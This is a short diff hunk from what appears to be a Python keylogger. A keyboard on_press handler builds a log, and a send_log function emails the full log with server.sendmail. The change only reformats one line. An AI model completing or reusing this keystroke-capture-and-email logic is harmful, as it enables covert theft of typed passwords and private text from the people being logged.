@@ -38,8 +38,7 @@ def on_press(key):
     global email
     global email_char_limit
       
-     def send_log():
-    server.sendmail(
+     def send_log():server.sendmail(
         email,
         email,
         full_log
